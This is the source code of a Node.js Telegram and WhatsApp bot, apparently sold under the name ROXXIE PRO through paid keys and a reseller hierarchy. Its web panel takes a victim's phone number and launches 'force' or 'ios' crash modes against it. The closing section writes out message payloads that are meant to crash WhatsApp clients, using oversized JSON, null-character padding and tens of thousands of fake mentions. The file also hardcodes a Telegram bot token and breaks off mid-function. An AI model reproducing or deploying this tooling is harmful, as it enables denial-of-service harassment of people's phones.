// ==================== MODULE IMPORTS ==================== //
const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const AdmZip = require("adm-zip");
const tar = require("tar");
const os = require("os");
const fse = require("fs-extra");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8333768796:AAG9cNT6nCErAeB2gcto_4350Im8kygXzSQ";
const OWNER_ID = "7964806637";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

// ==================== GLOBAL VARIABLES ==================== //
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/data.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {}; // key: username_mode, value: timestamp
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000; // default 5 menit
let userApiBug = null;
let sock;

// ==================== UTILITY FUNCTIONS ==================== //
const moment = require('moment');
moment.locale('id');

// RUNTIME FORMAT
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}
const startTime = Math.floor(Date.now() / 1000);
function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}
// Helper sleep function
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function loadData() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], moderator: [], partner: [], reseller: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveData(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadData();
  return data.owners.includes(id);
}

function isMod(id) {
  const data = loadData();
  return data.moderator.includes(id);
}

function isPartner(id) {
  const data = loadData();
  return data.partner.includes(id);
}

function isReseller(id) {
  const data = loadData();
  return data.reseller.includes(id); 
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

// User management functions
function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000;            // detik → ms
    case "m": return value * 60 * 1000;       // menit → ms
    case "h": return value * 60 * 60 * 1000;  // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

// ==================== GLOBAL COOLING SYSTEM ==================== //
// WhatsApp connection utilities
const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

// ==================== WHATSAPP CONNECTION HANDLERS ==================== //

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "DEWA1234");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};
// ==================== BOT COMMANDS ==================== //

// Start command
bot.command("start", (ctx) => {
  const runtime = getBotRuntime();
  const tanggal = moment().format('dddd, D MMMM YYYY');
  const teks = `( 🍁 ) ─── ❖
𝗪𝗘𝗟𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗕𝗢𝗧 𝗦𝗬𝗦𝗧𝗘𝗠
─── 革命的な自動化システム ───  
高速・柔軟性・絶対的な安全性を備えた 次世代ボットが今、覚醒する。

〢「 𝗥𝗢𝗫𝗫𝗜𝗘 ☇ 𝗣𝗥𝗢 ° 𝗦𝗬𝗦𝗧𝗘𝗠 」
ッ Developer : @CRAZYBOTZZ
ッ Tanggal 
╰➤ ${tanggal}
ッ Run Time Bot
╰➤ ${runtime}
┌─────────
├──── ( ム ) Menu Sender
│── /addbot
│── /listsender
│── /delsender
│── /setjeda
│── /add
╰➤
┌─────────
├──── ( ム ) Menu Key
│── /ckey
│── /listkey
│── /delkey
╰➤
┌─────────
├────( ム ) Menu Developer
│── /addowner
│── /delowner
╰➤
┌─────────
├────( ム ) Menu Owner
│── /addmoderator
│── /delmoderator
╰➤
┌─────────
├────( ム ) Menu Moderator
│── /addpartner
│── /delpartner
╰➤
┌─────────
├────( ム ) Menu Partner
│── /addreseller
│── /delreseller
╰➤`;
  
  ctx.reply(teks, { parse_mode: "HTML" });
});

// Sender management commands
bot.command("addbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] — Only Owner.");
  }

  if (args.length < 2) {
    return ctx.reply("Example : /addbot nomor", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] — Only Owner.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] — Only Owner.");
  }
  
  if (args.length < 2) return ctx.reply("Example : /delsender nomor", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender Tidak Ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session Untuk Bot ${number} Berhasil Dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi Error Saat Menghapus Sender.");
  }
});

// Helper untuk cari creds.json
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// ===== Command /add =====
bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

// Key management commands
bot.command("ckey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args   = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isMod(userId) && !isPartner(userId) && !isReseller(userId)) {
    return ctx.telegram.sendMessage(
      userId,
      "[ ! ] — Only Owner/Moderator/Partner/Reseller."
    );
  }
  
  if (!args || !args.includes(",")) {
    return ctx.telegram.sendMessage(
      userId,
      "Example : /ckey nama,durasi"
      
    );
  }

  const [username, durasiStr] = args.split(",");
  const durationMs            = parseDuration(durasiStr.trim());
  if (!durationMs) {
    return ctx.telegram.sendMessage(
      userId,
      "❌ Format Durasi Salah! Gunakan Contoh: 7d / 1d / 12h."
    );
  }

  const key     = generateKey(4);
  const expired = Date.now() + durationMs;
  const users   = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year    : "numeric",
    month   : "2-digit",
    day     : "2-digit",
    hour    : "2-digit",
    minute  : "2-digit",
    timeZone: "Asia/Jakarta"
  });

// Kirim detail ke user (DM)
ctx.telegram.sendMessage(
  userId,
  `✅ <b>Key berhasil dibuat:</b>\n\n` +
  `🆔 <b>Username:</b> <code>${username}</code>\n` +
  `🔑 <b>Key:</b> <code>${key}</code>\n` +
  `⏳ <b>Expired:</b> <i>${expiredStr}</i> WIB\n\n` +
  `<b>Note:</b>\n- Jangan disebar\n- Jangan difreekan\n- Jangan dijual lagi`,
  { parse_mode: "HTML" }
).then(() => {
  // Setelah terkirim → kasih notifikasi di group
  ctx.reply("✅ Success Create Key.");
}).catch(err => {
  ctx.reply("❌ Gagal Create Key.");
  console.error("Error Create Key:", err);
});
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId) && !isMod(userId) && !isPartner(userId) && !isReseller(userId)) {
    return ctx.reply("[ ! ] — Only Owner/Moderator/Partner/Reseller.");
  }
  
  if (users.length === 0) return ctx.reply("💢 Tidak Ada Daftar Key Di Database.");

  let teks = `🔒 *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
    if (!isOwner(userId) && !isMod(userId) && !isPartner(userId) && !isReseller(userId)) {
    return ctx.reply("[ ! ] — Only Owner/Moderator/Partner/Reseller.");
  }
  
  if (!username) return ctx.reply("Example: /delkey rann");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

// Access control commands
bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isPartner(userId)) {
    return ctx.reply("[ ! ] — Only Partner.");
  }
  
  if (!id) return ctx.reply("Example : /addreseller idbuyer", { parse_mode: "Markdown" });

  const data = loadData();
  if (data.reseller.includes(id)) return ctx.reply("❌ Sudah Ada Di Dalam Database.");

  data.reseller.push(id);
  saveData(data);
  ctx.reply(`✅ Buyer ${id} Ini Berhasil Di Tambahkan Di Database Owner.`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isPartner(userId)) {
    return ctx.reply("[ ! ] — Only Partner.");
  }
  
  if (!id) return ctx.reply("Example : /delreseller idbuyer", { parse_mode: "Markdown" });

  const data = loadData();
  if (!data.reseller.includes(id)) return ctx.reply("❌ Tidak Ada Di Dalam Database.");

  data.reseller = data.reseller.filter(uid => uid !== id);
  saveData(data);
  ctx.reply(`✅ ID ${id} Ini Sukses Di Delete Di Database Reseller.`);
});
bot.command("addpartner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isMod(userId)) {
    return ctx.reply("[ ! ] — Only Moderator");
  }
  
  if (!id) return ctx.reply("Example : /addpartner idbuyer", { parse_mode: "Markdown" });

  const data = loadData();
  if (data.partner.includes(id)) return ctx.reply("❌ Sudah Ada Di Dalam Database.");

  data.partner.push(id);
  saveData(data);
  ctx.reply(`✅ Buyer ${id} Ini Berhasil Di Tambahkan Di Database Partner.`);
});

bot.command("delpartner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isMod(userId)) {
    return ctx.reply("[ ! ] — Only Moderator.");
  }
  
  if (!id) return ctx.reply("Example : /delpartner idbuyer", { parse_mode: "Markdown" });

  const data = loadData();
  if (!data.partner.includes(id)) return ctx.reply("❌ Tidak Ada Di Dalam Database.");

  data.partner = data.partner.filter(uid => uid !== id);
  saveData(data);
  ctx.reply(`✅ ID ${id} Ini Sukses Di Delete Di Database Partner.`);
});
bot.command("addmoderator", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("Example : /addmoderator idbuyer", { parse_mode: "Markdown" });

  const data = loadData();
  if (data.moderator.includes(id)) return ctx.reply("❌ Sudah Ada Di Dalam Database.");

  data.moderator.push(id);
  saveData(data);
  ctx.reply(`✅ Buyer ${id} Ini Berhasil Di Tambahkan Di Database Moderator.`);
});

bot.command("delmoderator", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] — Only Owner.");
  }
  
  if (!id) return ctx.reply("Example : /delmoderator idbuyer", { parse_mode: "Markdown" });

  const data = loadData();
  if (!data.moderator.includes(id)) return ctx.reply("❌ Tidak Ada Di Dalam Database.");

  data.moderator = data.moderator.filter(uid => uid !== id);
  saveData(data);
  ctx.reply(`✅ ID ${id} Ini Sukses Di Delete Di Database Moderator.`);
});

bot.command("addowner", (ctx) => {
  const fromId = ctx.from.id;
  const id = ctx.message.text.split(" ")[1];
  
  if (String(fromId) !== String(OWNER_ID)) {
    return ctx.reply("[ ! ] — Only Developer.");
  }
  
  if (!id) return ctx.reply("Example : /addowner idbuyer", { parse_mode: "Markdown" });

  const data = loadData();
  if (data.owners.includes(id)) return ctx.reply("❌ Sudah Ada Di Dalam Database.");

  data.owners.push(id);
  saveData(data);
  ctx.reply(`✅ Buyer ${id} Ini Berhasil Di Tambahkan Di Database Owner.`);
});

bot.command("delowner", (ctx) => {
  const fromId = ctx.from.id;
  const id = ctx.message.text.split(" ")[1];
  
  if (String(fromId) !== String(OWNER_ID)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("Example : /delowner idbuyer", { parse_mode: "Markdown" });

  const data = loadData();

  if (!data.owners.includes(id)) return ctx.reply("❌ Tidak Ada Di Dalam Database.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveData(data);

  ctx.reply(`✅ ID ${id} Ini Sukses Di Delete Di Database Owner.`);
});

// ================== COMMAND /SETJEDA ================== //
bot.command("setjeda", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms; // sync ke alias lokal juga

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

// ==================== BOT INITIALIZATION ==================== //
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT ROXXIE PRO
├─ ID OWN : ${OWNER_ID}
├─ DEVOLOPER : CRAZYBOTZZ 
├─ CREDIT BY : CRAZYBOTZZ  
├─ BOT : CONNECTED ✅
╰───────────────────`));

initializeWhatsAppConnections();

// ==================== WEB SERVER ==================== //
// ==================== WEB SERVER ==================== //
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["force", "ios"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=force atau ?mode=ios."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "force") {
        forcecrash(24, target);
      } else if (mode === "ios") {
        crashios(24, target);
      } else if (mode === "blanksuper") {
        blank(24, target);
      } else if (mode === "superinvis") {
        invis(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(port, () => {
  console.log(`🚀 Server aktif di ${domain}:${port}`);
});

// ==================== EXPORTS ==================== //
module.exports = { 
  loadData, 
  saveData, 
  isOwner, 
  isMod,
  saveUsers,
  getUsers
};

// ==================== FLOOD FUNCTIONS ==================== //
// ====== FUNC FC IOS AND ANDRO ====== //
async function KontolCrtMakLoe(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3.2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 9999999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `드༑⌁⃰⃟𝚪𝚯𝗫𝐗ᎨÈ 𝕻Ɽ𝟬͜͢-‣꙱`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(1472),
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(0x3462)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function OtaxCrashInvisible(sock, target) {
    const corruptedJson = "{".repeat(1000000); 

    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: corruptedJson,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: corruptedJson,
                address: corruptedJson
              }
            },
            body: { text: corruptedJson },
            footer: { text: corruptedJson },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
            }
          }
        }
      },
      buttonsMessage: {
        contentText: corruptedJson,
        footerText: corruptedJson,
        buttons: [
          {
            buttonId: "btn_invis",
            buttonText: { displayText: corruptedJson },
            type: 1
          }
        ],
        headerType: 1
      },
      extendedTextMessage: {
        text: corruptedJson,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
        }
      },
      documentMessage: {
        fileName: corruptedJson,
        title: corruptedJson,
        mimetype: "application/x-corrupt",
        fileLength: "999999999",
        caption: corruptedJson,
        contextInfo: {}
      },
      stickerMessage: {
        isAnimated: true,
        fileSha256: Buffer.from(corruptedJson).toString("base64"),
        mimetype: "image/webp",
        fileLength: 9999999,
